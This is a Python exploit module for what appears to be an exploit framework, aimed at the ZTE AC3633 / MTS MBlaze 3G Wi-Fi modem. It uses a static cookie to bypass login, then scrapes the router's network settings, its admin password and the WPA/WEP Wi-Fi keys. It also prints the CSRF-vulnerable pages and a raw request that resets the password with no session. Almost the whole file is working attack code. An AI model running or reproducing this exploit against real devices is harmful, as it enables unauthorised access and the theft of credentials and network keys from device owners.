from basic import Exploit
import oops

import requests
import sys


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


class TotsModule(Exploit):
    def __init__(self, provided_argument_string=""):
        super().__init__(provided_argument_string)

    def local_arguments(self):
        return [
            {"name": "target", "type": str, "nargs": "+", "help": "Target for the exploit",
             "default": "http://SLD.TLD"},
        ]

    def execute(self):
        # Vulnerable Static Cookies
        static_cookies = {"iusername": 'logined'}
        # Login Bypass
        print("Attempting to Login to: {url}".format(url=self.target))

        try:
            login_response = requests.get("{url}/en/index.asp".format(url=self.target), cookies=static_cookies)
            print("Login Bypass Status Code: {status_code}".format(status_code=str(login_response.status_code)))
        except requests.exceptions.RequestException:
            raise oops.ExploitFailure("Cannot Reach: {url}".format(url=self.target))
            sys.exit(1)

        if "3g.asp" in login_response.text:
            print("Login Succesfull!")

        # Information Gathering Section
        information_response = requests.get("{url}/en/3g.asp".format(url=self.target), cookies=static_cookies)

        found_ip = find_between(information_response.text,
                                '"g3_ip" disabled="disabled" style="background:#ccc;" size="16" maxlength="15" value="',
                                '"></td>')
        found_subnet = find_between(information_response.text,
                                    '"g3_mask" disabled="disabled" style="background:#ccc;"  size="16" maxlength="15" value="',
                                    '"></td>')
        found_gateway = find_between(information_response.text,
                                     '"g3_gw" disabled="disabled" style="background:#ccc;"  size="16" maxlength="15" value="',
                                     '"></td>')

        print("""
Information Gathering
=====================
""")
        print("IP: {ip}".format(ip=found_ip))
        print("Subnet: {subnet}".format(subnet=found_subnet))
        print("Gateway: {gateway}".format(gateway=found_gateway))

        # Steal Login Password
        print("""
Stealing Router Login Credentials
=================================
""")
        password_response = requests.get("{url}/en/password.asp".format(url=self.target), cookies=static_cookies)
        found_password = find_between(password_response.text, 'id="sys_password" value="', '"/>')
        print("Status : {status}".format(status=password_response.status_code))
        # No we don't need to do it like this, but in the event that someone sets this up with a way to detect the username I want this to be something that can be changed easily
        print("Username : {username}".format(username="admin"))
        print("Password : {password}".format(password=found_password))

        # Wi-Fi Password Extraction
        wifi_response = requests.get("{url}/en/wifi_security.asp".format(url=self.target), cookies=static_cookies)
        print("""
Extracting WPA/WPA2 PSK Key
=======================(sic)

Status: {status}
WPA/WPA2 PSK: {wpa_key}
WEP Key: {wep_key}
""".format(status=wifi_response.status_code, wpa_key=find_between(wifi_response.text, "wpa_psk_key]').val('", "');"),
                   wep_key=find_between(wifi_response.text, "wep_key]').val('", "');")))

        print("""
Other Vulnerabilities
=====================
1.Cross Site Request Forgery in:

http://192.168.1.1/en/dhcp_reservation.asp
http://192.168.1.1/en/mac_filter.asp
http://192.168.1.1/en/password.asp

2.Password Reset without old password and Session

POST /goform/formSyWebCfg HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.1/en/password.asp
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,es;q=0.6,ms;q=0.4
Content-Length: 52

action=Apply&sys_cfg=changed&sys_password=mblazetestpassword
""")

    def thanks(self):
        print("""
#Author: Ajin Abraham - xboz
#http://opensecurity.in
#Product MTS MBlaze 3G Wi-Fi Modem
#System Version 107
#Manufacturer ZTE
#Model 	AC3633
""")

    def help(self):
        return """
MTS MBlaze Ultra Wi-Fi / ZTE AC3633 Exploit
Vulnerabilities
Login Bypass | Router Credential Stealing | Wi-Fi Password Stealing | CSRF | Reset Password without old password and Session
"""
